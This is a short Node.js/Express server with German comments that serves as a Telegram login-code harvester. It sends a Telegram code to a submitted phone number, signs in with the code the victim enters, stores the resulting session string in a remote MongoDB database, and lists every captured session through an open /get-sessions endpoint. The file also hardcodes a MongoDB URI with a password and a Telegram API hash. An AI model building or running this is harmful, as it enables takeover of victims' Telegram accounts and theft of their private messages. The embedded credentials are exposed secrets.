const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Setup
const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0';
mongoose.connect(MONGO_URI);

const SessionSchema = new mongoose.Schema({ session: String, phone: String });
const Session = mongoose.model('Session', SessionSchema);

const apiId = 23049703; // Deine ID
const apiHash = 'e9c00af578a9de0253ef02337460498f'; // Dein Hash

// Speicher für temporäre Client-States (in-memory)
const activeClients = new Map();

app.post('/send-otp', async (req, res) => {
    const { phone } = req.body;
    try {
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, phone);
        
        activeClients.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
    } catch (error) {
        res.status(400).json({ success: false, message: error.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code, phoneCodeHash } = req.body;
    const state = activeClients.get(phone);
    
    if (!state) return res.status(400).json({ success: false, message: "Session abgelaufen" });

    try {
        await state.client.signIn({
            apiId,
            apiHash,
            phoneNumber: phone,
            phoneCode: code,
            phoneCodeHash: phoneCodeHash
        });

        const stringSession = state.client.session.save();
        await Session.create({ session: stringSession, phone });
        
        res.json({ success: true });
        activeClients.delete(phone);
    } catch (error) {
        res.status(400).json({ success: false, message: error.message });
    }
});

app.get('/get-sessions', async (req, res) => {
    const sessions = await Session.find();
    res.json(sessions);
});

app.listen(3000, () => console.log('Server läuft auf Port 3000'));
